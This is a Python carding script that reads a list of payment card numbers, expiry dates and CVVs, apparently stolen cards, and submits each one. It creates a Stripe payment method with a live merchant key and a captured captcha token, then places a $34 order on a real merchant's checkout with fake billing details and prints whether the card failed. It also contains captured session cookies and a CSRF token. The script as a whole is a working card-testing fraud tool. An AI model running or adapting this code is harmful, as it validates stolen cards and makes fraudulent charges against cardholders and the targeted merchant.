try:
	import requests,re,time
	from colorama import Fore
	from bs4 import BeautifulSoup
	import pyfiglet
	import os
	import time
except ImportError:
	os.system('pip install requests')
	os.system('pip install re')
	os.system('pip install time')
	os.system('pip install colorama')
	os.system('pip install bs4')
	os.system('pip install pyfiglet')


D = '\033[2;32m'
E = '\033[2;31m'
E = '\033[2;33m'
E = '\033[2;34m'
B = '\033[2;35m'
logo = pyfiglet.figlet_format('')
print(B+logo)
L = '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n'
print(D+L)
path = input("Cambo :  ")
start = 0
with open(path) as file:
                lino = file.readlines()
                lino = [line.rstrip() for line in lino]
                
for e in lino:
    time.sleep(5)
    cc = e.split('|')[0]
    mm = e.split('|')[1]
    yy = e.split('|')[2][-2:]
    cvv = e.split('|')[3]
    card=e.replace('\n','')

    headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
    data = f'billing_details[address][city]=New+york&billing_details[address][country]=US&billing_details[address][line1]=Hh&billing_details[address][line2]=&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&billing_details[name]=Mok+Hnr&billing_details[email]=mokshfbbha0155%40gmail.com&type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.choseizen.org&time_on_page=66308&client_attribution_metadata[client_session_id]=d8769de2-7599-45af-b6e2-a8c55e90ba0f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=93494dcf-adcd-4631-a465-c81054a6e5e1ccf186&muid=2a502e2b-5e33-4dc4-bf34-347d3459a4ac3b370b&sid=4b14cf60-714e-4224-afa1-bfa7e4354ea49f8342&key=pk_live_51MRggLGWXxnzSsWpDPQed2rtHjDLvazu1P97l8sucdbMrBG0jBzW9lhuTUiUzbXXATnU97UFqsAoNF0t6MUbxYrv001mRBD6Tr&_stripe_account=acct_1MRggLGWXxnzSsWp&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVTZVNGJDZWxGdmQzOUg5VFl1QkNsMEJZOTFHTXk5TmUyOU82UStRbDY0YjNjdzlDeUprZFkwVVZvWHUwaXY4SzNJZzNiVERKdmxqTXYwSThuQ2hXVERFL2Y1ckZWd3dpNVpYOWUvYUVJQ0hDelk3cENaaEFDVFZpZDhzdDdMakJzSVlmVGQyMnBxd0NJMm5FWkZSc0RMVWNKbThBM1dsb2FoaXdMM3B0SDgzeVRsN2pnb2RQa25PUU01UTJXUm5JVU9DaHZWQjMvM0t0RlRqeEpIQ2JTODljT0NNRG9MajdUR3pqNHhLUTI0bG5KckYyUkRuMjF1djhrcUw2U0VwT0hBMGc0aVlNODU3aEgwSERjWlF6b2tMU3JKR1BuTkNVYU4rYkY4TVNQSXY0Z3h4NWRhUkFzaTAvWmFqU3BXQ1ZmQ0E2cU95TW1FdWlWcU1JNGxiL2dsZ2VacmFrZXd6c3RUQmdCVnN1enZnMUhobGZiUHpYNGhGTldkR3NNSm8wbUgxVkxqT1JScmNjTkRXUWk3dmpQaWdaNmhxdW1DcCtEU0Q4bTdVL0k2Rlk2akdVclMwR0RpOHpDc2RrWEhueHhDeEc5MDIxbld1U3ZKa1drT2FYWDg3OE1YVUJHcjNuNzh2a3d5L3ZxY21CQWxxelZlQ0dEVEZmdnFvTldxVWFFSVdIRVBocTR1MUJuVjBGajRqbFZlRzhrMDA5RTcvYXU3RHBSTkM3b3ZBa1U3cUI2ZFl3QlAzUGQ5ZnBCMXZuS2ZMaTFjbE1DdmtLVU85dm8zM0hiMDJQMHVobUg3NSt1Umk4WTBHcDNHZThjRXNqRzBZRGVtODBnb0Y3bGVZZTBEU0JzbGJtNlR6b1N2MWhmYTZVaFExeVhLc3dUbWI5WTl0N3lHWi82MWNrdDdXYkVWaXhWTG9OZVBlUXpzWkpIWG80dDJIdVQvNE41bU5Qay9VSlJJT3hSam1oMmhtZnRWZmhuazhxWDY5ZUk0ak5sUzBrVzQxZldLdGNFKytxZ0tGZEdXdlhHdXh0aDRzdG5HSGRXbkxkTmhkcllWdVdyWkJCTjdqcVREc2piWUtleUhUOHN1cFRiVTJKUjRiRGVqUHZ5dWlBQ1hhVUgvblQxWGtvSlJzTnBTa1FsellsR2ZZZkNpWmZWbnRMeW44L05vMlNMaHJFQzBaTC9xYklNR1orYkZIMkxyWEh1Um51ejRoV3o4VEgyQjVqWUdpZm5kdks0dXZlMlZ5V2FRVEFneG5ZTE9OTVg3cUg3WUZsTlVNK2JaUWJBdkxkeXRwSWNVNkZBcG1xOTl3c1JLalVaZnZsYnRneUVSRU51SC92bGUzSWM1NzhycnBGb2NEK0hscXZQSVdpSkx0U0NDalNNWVdpSmFJd1dpODh2UW02MnFIbW1udDdyQUo1WnF0K01jdXhvSENWK3VWQVg1WTd0OGxya3o0WUhlVDk5U3dBL3BKQndOTzRUQnpsR0lyMjVITkFPdGhFNFlXbHBRcG05RCtmaTd1NW1TaHIxSVZmNHVVK2VsWEZEdUpSV3JIN25PVFB3aXNxWTg4ejNyMnR4N2M1bnlIWFdoRlk0YXFOYTJWTm5JU3IxUGFlcGNLZS9SSU84U0RWK2FPYnk4VzcrUkpXRnpyNXVOMEZyTDJ6TGplVHhWMW85Q2lTQ2w5WVB6VFUrWWFCL2JWVnRsQ1JBa3p0dWlnVGRDSE0rZno3b1hRSzU3YUd2M3RGWGVLOCtOMjJWdzZBejNVQktrT1dxLzU4RWs2YkxDSVRmVDdwRFNVRzBIVlBLS3lZamd4V1VOWlBwc0RlaWZYaVQ5UTA5amcwQ0RobzV4bmwzQ1VqclZ3aGhsQytKSkVqSzNDQ0RGWU12N3BGSldYOXhUcmRXQlIraGVKYVVpSEFCeEoxN0l1NS9jMUxSeEtzdkRuRStha2tvS1lKU1A5KzZYYXpzLzJuV0hYdWNjeS9sR3pscVZXUDJaZ2ZzWEtMZEtKVTdPcm9uTWdTTVYxZGx6dStmNGJLbS9RdUZ4YXphMDFqUXFwemxuRmVsVXQxRnJJbVJXaUJpR0NVaUJQUE9oZ3NoRTRlZnIyZS9HRDVFVTNwUWhJS2NTb3JObWs3QjZIT28rT0xQYWtSZW9SaSt0UFhaTHBlaEVXNVdIWnZVdzRab3YvS2YxemFEcy9vZXgxUFp2SElCK0dFOElFcXpDaVpraTNzUXpDTTZmYzRlMFRlWmJRQi8wVU5ISlQ0QTZ2OHgveStkQUtWOVdzcEFxT0VDbjVqZ0lSREkrU0xTV0xEOERNS2N3UWpQS3BzSTBFQWN5Q3dscTFYekZuelRQZzhZWmhIeDV5cHdFZkwva21qcUVLaFI3TDhEaFVpOGlkemFraVhFcVFHTi9vNzhKT2JDS3g5dHA3ZDhPakxVc2d0enI4WHVpRFgxUzlVMlVtTzA0R3hCNWNmNW5TcEt6S2t2b1BkV0NaR0YwTHR6anpRYVRrTXNaaWxMQXZVc0ZuTmpZMmpNQ0ZxUmNxbTFuN2UwMGNpY3NaVW4zUmpjVDk4UG1PNXpEdmdlbmNxQitPYnE0ZUFnZkFxMHppSjNoU2JzZTdWMFRvd24xNlVmUWNFL08zT0NFd2NMWDcrcEhtLzJVeXBMd3VCZlRyWEpuL2loeVRDaXZRZEk0bXhja3Q2UzVoaVphaXFhZkZJcWxYTEdCL05VWXJvY2ZVSk5WeU5DR0Z3V3JtLzJqVnNWK0tkT3BKcmxkd3dISTF0NjFLeUlKdjl2NTRHd293QjBUTlU2cU15UEkzUnhMaTZuVHd1ay9vZGl2Y0t5eVZCcU84PSIsImV4cCI6MTc0NDYxOTQ1NCwic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjIzZTRlZTJmIiwicGQiOjAsImNkYXRhIjoiZ1Vqd2k1R3dBQUZ0NEZ1R0R5SlFHYjFMazhuRmtTS2RKaFdEd3A0M2tZVUNkVTVFbXpCTklrVEVtYTNZQ0ZsZ1J4SFY5NGxoWklEZTlTRzRxa1g2dnMwdWVib0ZKVittMmtvWXl6QlhUZTdGNWpEZW50R1NuNlAyTUppWHZOS0Z0eXFkQm5SbFI5bXl4VmsrVGVwMlV4amZTcDg1U3VoUmw2TkxSMTlHU0IydTlHOTdVR1N6QTEraE1PRzh5OEo1cCtEMzFDU1oyMnF3VVh4RSJ9.bwigtpO-Ey8f7d0TFhUxpIumh6TLYFYlXMrBc8a6zo0'
	
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
    id = (response.json()['id'])
	
	
	
#	import requests
	
    cookies = {
	    'crumb': 'BaAVO+aCP2czYjcyMGRjZThmYmJiNmEzYmIxNTUwYWFjMGUzMjky',
	    'ss_cvr': '9ea03faf-0783-48c2-b1b3-fd152358a924|1744619294346|1744619294346|1744619294346|1',
	    'ss_cvt': '1744619294346',
	    '_ga': 'GA1.1.995421993.1744619295',
	    '_fbp': 'fb.1.1744619294914.426867711744381146',
	    'CART': 'nz3O_o9_mzra8bPb8DT8rRksj7SXFt3ZxDx4KO_T',
	    'hasCart': 'true',
	    '_ga_DEXES2KD6E': 'GS1.1.1744619294.1.1.1744619323.0.0.0',
	    '__stripe_mid': '2a502e2b-5e33-4dc4-bf34-347d3459a4ac3b370b',
	    '__stripe_sid': '4b14cf60-714e-4224-afa1-bfa7e4354ea49f8342',
	}
	
    headers = {
	    'authority': 'www.choseizen.org',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
	    'content-type': 'application/json;charset=UTF-8',
	    # 'cookie': 'crumb=BaAVO+aCP2czYjcyMGRjZThmYmJiNmEzYmIxNTUwYWFjMGUzMjky; ss_cvr=9ea03faf-0783-48c2-b1b3-fd152358a924|1744619294346|1744619294346|1744619294346|1; ss_cvt=1744619294346; _ga=GA1.1.995421993.1744619295; _fbp=fb.1.1744619294914.426867711744381146; CART=nz3O_o9_mzra8bPb8DT8rRksj7SXFt3ZxDx4KO_T; hasCart=true; _ga_DEXES2KD6E=GS1.1.1744619294.1.1.1744619323.0.0.0; __stripe_mid=2a502e2b-5e33-4dc4-bf34-347d3459a4ac3b370b; __stripe_sid=4b14cf60-714e-4224-afa1-bfa7e4354ea49f8342',
	    'origin': 'https://www.choseizen.org',
	    'referer': 'https://www.choseizen.org/checkout?cartToken=nz3O_o9_mzra8bPb8DT8rRksj7SXFt3ZxDx4KO_T',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-csrf-token': 'BaAVO+aCP2czYjcyMGRjZThmYmJiNmEzYmIxNTUwYWFjMGUzMjky',
	}
	
    json_data = {
	    'email': 'mokshfbbha0155@gmail.com',
	    'subscribeToList': False,
	    'shippingAddress': {
	        'id': '',
	        'firstName': 'Mok',
	        'lastName': 'Hnr',
	        'line1': 'Hh',
	        'line2': '',
	        'city': 'New york',
	        'region': 'NY',
	        'postalCode': '10080',
	        'country': 'US',
	        'phoneNumber': '0364475004',
	    },
	    'createNewUser': False,
	    'newUserPassword': None,
	    'saveShippingAddress': False,
	    'makeDefaultShippingAddress': False,
	    'customFormData': None,
	    'shippingAddressId': None,
	    'proposedAmountDue': {
	        'decimalValue': '34',
	        'currencyCode': 'USD',
	    },
	    'cartToken': 'nz3O_o9_mzra8bPb8DT8rRksj7SXFt3ZxDx4KO_T',
	    'paymentToken': {
	        'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
	        'token': id,
	        'type': 'STRIPE',
	    },
	    'billToShippingAddress': True,
	    'billingAddress': {
	        'id': '',
	        'firstName': 'Mok',
	        'lastName': 'Hnr',
	        'line1': 'Hh',
	        'line2': '',
	        'city': 'New york',
	        'region': 'NY',
	        'postalCode': '10080',
	        'country': 'US',
	        'phoneNumber': '0364475004',
	    },
	    'savePaymentInfo': False,
	    'makeDefaultPayment': False,
	    'paymentCardId': None,
	    'universalPaymentElementEnabled': True,
	}
	
    response = requests.post('https://www.choseizen.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data)
	
    print(f'{e}',response.json()['failureType'])